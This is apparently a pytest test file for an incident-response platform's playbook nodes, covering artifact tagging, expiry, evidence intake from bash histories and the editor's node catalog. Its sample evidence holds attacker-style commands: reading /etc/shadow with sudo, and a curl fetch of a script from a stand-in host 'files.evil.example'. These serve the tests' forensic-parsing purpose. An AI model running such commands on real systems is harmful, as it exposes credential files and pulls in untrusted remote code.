        ("nik.add-artifact-tags", {"artifact": notes, "tags": "Not A Tag!"}, "A tag of an artifact is lower-case"),
        ("nik.add-artifact-tags", {"artifact": notes, "tags": [f"t{n}" for n in range(13)]}, "An artifact has 12 tags"),
        ("nik.set-artifact-expiry", {"artifact": notes, "expires": "soon"}, "An expiry is a date: 2027-01-31"),
        ("nik.set-artifact-expiry", {"artifact": notes, "expires": "2020-01-01"}, "An expiry is a day to come"),
        # A capture belongs to one incident at most.
        ("nik.link-artifact", {"artifact": capture, "incident": "i2"}, "The capture is in another incident"),
        ("nik.unlink-artifact", {"artifact": "file-" + "d" * 64}, "The artifact does not exist"),
    ):
        run = go(admin, chain(admin, f"Bad {why}", act("bad", name, **args)), objectKind="incident", objectId="i1")
        assert run["status"] == "failed" and steps(run)["bad"]["error"].startswith(why), steps(run)["bad"]["error"]
    cleared = go(admin, chain(admin, "No date", act("date", "nik.set-artifact-expiry", artifact=notes)))
    assert steps(cleared)["date"]["output"] == {"expires": "", "changed": True}


# --------------------------------------------------------------------------- #
# Host evidence                                                               #
# --------------------------------------------------------------------------- #
def reading_here(monkeypatch, events=None):
    """The worker that reads files is there, and the reading starts where it is asked (not in a thread)."""
    from app import work
    from app.evidence import parse
    from tests.test_evidence_intake import HISTORY
    from tests.test_evidence_parse import end, record

    monkeypatch.setattr(settings, "FORENSICS_URL", "http://forensics.test")
    said = events if events is not None else [HISTORY, record(1), record(2), end(2, in_file=2)]
    monkeypatch.setattr(parse, "_events", lambda sha256, body, job: iter(said))

    def start(source_id, _params=None):
        with work.hold(parse.WORK, source_id) as claim:
            parse.read(source_id, claim)
        return True

    monkeypatch.setattr(parse, "start", start)


def test_host_evidence_is_kept_and_read_as_a_source_of_the_incident(admin: TestClient, monkeypatch):
    reading_here(monkeypatch)
    incident(admin, "i1")
    history = "#1700000000\nsudo cat /etc/shadow\ncurl http://files.evil.example/x.sh\n"
    held = upload(admin, ".bash_history", b"#1700000001\nwhoami\n")
    typed = act("typed", "nik.add-evidence", kind="commands", shell="bash", content=history, name=".bash_history")
    dry = go(admin, chain(admin, "Evidence dry", typed), objectKind="incident", objectId="i1", dryRun=True)
    would = {"rows": 0, "format": "history", "target": "commands/bash", "sourceId": "", "read": ""}
    assert steps(dry)["typed"]["output"] == would
    assert steps(dry)["typed"]["request"]["would"] == "add commands evidence"
    assert admin.get("/api/incidents/i1/evidence/sources").json()["sources"] == []

    run = done(admin, chain(admin, "Evidence", typed), objectKind="incident", objectId="i1")
    assert run["status"] == "done", run["error"]
    output = steps(run)["typed"]["output"]
    assert (output["rows"], output["format"], output["target"], output["read"]) == (
        2,
        "history",
        "commands/bash",
        "complete",
    )
    (source,) = admin.get("/api/incidents/i1/evidence/sources").json()["sources"]
    assert source["id"] == output["sourceId"]
    assert admin.get("/api/incidents/i1").json()["data"] == {}
    entry = admin.get("/api/audit?q=action:command.upload").json()["entries"][0]
    assert entry["actor"] == "nik-automation" and entry["details"].startswith("Uploaded .bash_history → commands/bash")

    # The same file again is the source the incident has: nothing is read twice.
    again = done(admin, chain(admin, "Evidence twice", typed), objectKind="incident", objectId="i1")
    assert steps(again)["typed"]["output"]["sourceId"] == output["sourceId"]
    assert len(admin.get("/api/incidents/i1/evidence/sources").json()["sources"]) == 1

    # From a file Nik holds: read from the store, kept the same way.
    # Other records than the first file's (the same ones would be duplicates of it, and kept once).
    from tests.test_evidence_intake import HISTORY
    from tests.test_evidence_parse import end, record

    reading_here(monkeypatch, [HISTORY, record(3), record(4), end(2, in_file=2)])
    stored = act("stored", "nik.add-evidence", kind="commands", shell="bash", artifact=held)
    run = done(admin, chain(admin, "Evidence from a file", stored), objectKind="incident", objectId="i1")
    assert (
        steps(run)["stored"]["output"]["rows"] == 2 and steps(run)["stored"]["output"]["sourceId"] != output["sourceId"]
    )

    for args, why in (
        ({"kind": "commands", "shell": "nope", "content": "x"}, "Unknown shell 'nope'."),
        ({"kind": "commands", "shell": "bash"}, "Give an artifact or a content, one of the two"),
        (
            {"kind": "endpoint", "category": "persistence", "source": "cron", "content": "x"},
            "Set the incident's operating",
        ),
    ):
        run = go(
            admin,
            chain(admin, f"Bad {args}", act("bad", "nik.add-evidence", **args)),
            objectKind="incident",
            objectId="i1",
        )
        assert run["status"] == "failed" and steps(run)["bad"]["error"].startswith(why), steps(run)["bad"]["error"]


def test_a_file_that_cannot_be_read_fails_the_step_with_the_reason(admin: TestClient, monkeypatch):
    skip = {"t": "skip", "reason": "not a history", "lost": 1, "detail": "binary"}
    reading_here(monkeypatch, [skip])
    incident(admin, "i1")
    node_ = act("typed", "nik.add-evidence", kind="commands", shell="bash", content="x\n", name="h")
    run = done(admin, chain(admin, "Unreadable", node_), objectKind="incident", objectId="i1")
    assert run["status"] == "failed" and steps(run)["typed"]["error"] == "not a history: binary"


def test_a_worker_that_cannot_write_to_the_store_has_the_api_process_keep_the_evidence(admin: TestClient, monkeypatch):
    from app.malware import samples

    reading_here(monkeypatch)
    monkeypatch.setattr(samples, "store_writable", lambda: False)
    incident(admin, "i1")
    node_ = act("typed", "nik.add-evidence", kind="commands", shell="bash", content="whoami\n", name="h")
    run_id = start(admin, chain(admin, "Handed over", node_), T0, objectKind="incident", objectId="i1")
    worker.drain(T0)
    assert steps(run_of(admin, run_id))["typed"]["status"] == "waiting"
    (job,) = jobs()
    assert (job.kind, job.status) == ("evidence", "queued") and carried(job.id) == b"whoami\n"
    assert admin.get("/api/incidents/i1/evidence/sources").json()["sources"] == []
    run = settle(admin, run_id)
    assert run["status"] == "done", run["error"]
    assert steps(run)["typed"]["output"]["read"] == "complete"
    assert len(admin.get("/api/incidents/i1/evidence/sources").json()["sources"]) == 1


# --------------------------------------------------------------------------- #
# The editor                                                                  #
# --------------------------------------------------------------------------- #
FILES = {
    "nik.add-file",
    "nik.add-evidence",
    "nik.link-artifact",
    "nik.unlink-artifact",
    "nik.list-artifacts",
    "nik.get-artifact",
    "nik.add-artifact-tags",
    "nik.remove-artifact-tags",
    "nik.set-artifact-expiry",
    "nik.analyse-artifact",
    "nik.get-analysis",
    "nik.download-file",
    "nik.unpack-artifact",
}


def test_the_nodes_are_in_the_library_under_a_group_of_their_own(admin: TestClient):
    found = admin.get("/api/automation/catalog").json()
    nodes = {entry["id"]: entry for entry in found["nodes"]}
    assert {entry["id"] for entry in found["nodes"] if entry["group"] == "Files"} == FILES
    assert all(nodes[name]["changesOutside"] is False and nodes[name]["description"] for name in FILES)
    assert [argument["name"] for argument in nodes["nik.analyse-artifact"]["arguments"]] == [
        "artifact",
        "as",
        "incident",
        "analysis",
        "wait",
        "wait_minutes",
    ]
    assert nodes["nik.analyse-artifact"]["arguments"][3]["choices"] == ["", "static", "code", "capabilities"]
    assert nodes["nik.analyse-artifact"]["arguments"][1]["choices"] == ["", "mail", "capture"]
    # No browser to upload from: the description of the node says what "a file" can be.
    assert "A playbook has no browser to upload from" in nodes["nik.add-file"]["description"]
    assert "nothing is run or opened" in nodes["nik.add-file"]["description"]


def paths_of(entry: dict, node_id: str) -> list[str]:
    found = []
    for output in entry["outputs"]:
        found.append(f"{node_id}.{output['name']}")
        for item in output.get("shape") or []:
            joint = "" if item["name"].startswith("[") else "."
            found.append(f"{node_id}.{output['name']}{joint}{item['name']}")
    return found


def test_every_path_the_editor_offers_under_a_file_node_is_there_when_a_playbook_runs(
    admin: TestClient, no_dns, outside, monkeypatch
):
    from tests.stores import zip_of

    reading_here(monkeypatch)
    incident(admin, "i1")
    outside.host("files.example.org")
    outside.answer("files.example.org", 200, body=b"a tool, as text", path="/tool.txt")
    archive = upload(admin, "collected.zip", zip_of({"a.txt": b"one", "empty.txt": b""}))
    mail = upload(admin, "reported.eml", phishing_message(), "mails", "i1")
    tool = upload(admin, "tool.exe", minimal_pe(b"\x90\xc3"), incident_id="i1")
    entries = {entry["id"]: entry for entry in admin.get("/api/automation/catalog").json()["nodes"]}
    nodes = [
        act("add", "nik.add-file", content=REPORT, name="report.csv"),
        act("evidence", "nik.add-evidence", kind="commands", shell="bash", content="whoami\n"),
        act("link", "nik.link-artifact", artifact=tool),
        act("listed", "nik.list-artifacts"),
        act("got", "nik.get-artifact", artifact=mail),
        act("tag", "nik.add-artifact-tags", artifact=tool, tags=["seen"]),
        act("untag", "nik.remove-artifact-tags", artifact=tool, tags=["seen"]),
        act("date", "nik.set-artifact-expiry", artifact=tool, expires=7),
        act("analyse", "nik.analyse-artifact", artifact=tool),
        act("read", "nik.get-analysis", artifact=mail),
        act("out", "nik.unlink-artifact", artifact=tool),
        act("fetched", "nik.download-file", url="https://files.example.org/tool.txt"),
        act("unpacked", "nik.unpack-artifact", artifact=archive),
    ]
    assert {item["config"]["action"] for item in nodes} == FILES
    wanted = [path for item in nodes for path in paths_of(entries[item["config"]["action"]], item["id"])]
    assert "read.mail.attachments[0].place" in wanted and "listed.artifacts[0].sha256" in wanted
    assert "analyse.skipped[0].reason" in wanted and "read.file.attack" in wanted and "add.page" in wanted
    reading = node(
        "reads", "action", action="nik.add-note", args={"text": " ".join(f"{{{{ {path} | json }}}}" for path in wanted)}
    )
    pb = chain(admin, "Reads it all", *nodes, reading)
    hosts = {"mode": "listed", "hosts": ["files.example.org"]}
    assert admin.put(f"/api/automation/playbooks/{pb}/egress", json=hosts).status_code == 200
    run = done(admin, pb, objectKind="incident", objectId="i1")
    assert run["status"] == "done", run["error"] or steps(run)

    # In a dry run too; what a dry run does not start has nothing in its list of what was left out.
    kept = [path for path in wanted if not path.startswith("analyse.skipped[0]")]
    reading = node(
        "reads", "action", action="nik.add-note", args={"text": " ".join(f"{{{{ {path} | json }}}}" for path in kept)}
    )
    pb = chain(admin, "Reads it dry", *nodes, reading)
    assert admin.put(f"/api/automation/playbooks/{pb}/egress", json=hosts).status_code == 200
    dry = go(admin, pb, objectKind="incident", objectId="i1", dryRun=True)
    assert dry["status"] == "done", dry["error"] or steps(dry)

    for spec in actions.all_specs():
        for output in spec.outputs if spec.group == "Files" else ():
            shape = output.get("shape")
            assert shape is None or all(set(item) == {"name", "type", "description"} for item in shape), spec.id


def test_nothing_of_a_file_enters_the_state_of_a_run(admin: TestClient):
    marker = "MARKER-" + "z" * 40
    sample = upload(admin, "marked.txt", f"{marker} http://files.evil.example/a".encode())
    nodes = [
        act("got", "nik.get-artifact", artifact=sample),
        act("read", "nik.get-analysis", artifact=sample),
        act("analyse", "nik.analyse-artifact", artifact=sample),
    ]
    run = done(admin, chain(admin, "By reference", *nodes))
    assert run["status"] == "done", run["error"]
    assert marker not in str(run)
    assert {"type": "url", "value": "http://files.evil.example/a"} in steps(run)["read"]["output"]["indicators"]
